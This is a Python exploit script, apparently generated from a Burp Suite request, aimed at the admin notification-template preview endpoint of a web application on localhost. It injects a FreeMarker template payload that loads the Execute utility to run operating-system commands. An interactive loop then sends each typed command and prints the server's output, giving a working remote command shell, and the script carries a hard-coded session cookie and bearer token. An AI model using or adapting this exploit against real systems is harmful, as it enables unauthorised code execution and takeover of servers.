import requests
import copy
session = requests.session()

burp0_url = "http://localhost:8080/api/admin/notificationSupplement/preview?$top=-1&fields=output,issueId,error"
burp0_cookies = {"YTJSESSIONID": "node01gqnf8p7zexp91sr42i4petg8s64.node0"}
burp0_headers = {"sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=UTF-8", "Authorization": "Bearer 1683065164852.be561191-dbd3-4457-86f5-592c273d3a82.1e31bb66-596d-41d6-9137-09b74c484055.be561191-dbd3-4457-86f5-592c273d3a82 6ab631e2-61a7-4806-b029-44f0753fc29a 0-0-0-0-0;1.MCwCFGEInH0hHDgzvBHyel2pw4Pi92OGAhQJhvn6hGpzvagYSs0JDeCqqtM6FQ==", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "sec-ch-ua-platform": "\"Linux\"", "Origin": "http://localhost:8080", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:8080/admin/notificationTemplates/article_digest_subject", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_json={"$type": "NotificationPreview", "template": {"$type": "NotificationTemplate", "availableVariables": [{"$type": "TemplateVariable", "id": "from", "type": "User"}, {"$type": "TemplateVariable", "id": "to", "type": "User"}, {"$type": "TemplateVariable", "id": "reason", "type": "Reason"}, {"$type": "TemplateVariable", "id": "article", "type": "Article"}, {"$type": "TemplateVariable", "id": "change", "type": "Change"}, {"$type": "TemplateVariable", "id": "last_notification", "type": "boolean"}], "content": "<#assign classloader=article.class.protectionDomain.classLoader>\n<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>\n<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"REPLACE_ME_WITH_CMD\")}", "description": "", "fileName": "article_digest_subject.ftl", "id": "article_digest_subject", "overrided": False}}

cmd = ""
while cmd != "exit":
    cmd = input(">> ")
    burp1_json = copy.deepcopy(burp0_json)
    burp1_json["template"]["content"] = burp1_json["template"]["content"].replace("REPLACE_ME_WITH_CMD", cmd)
    r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp1_json)
    print(r.json()["output"])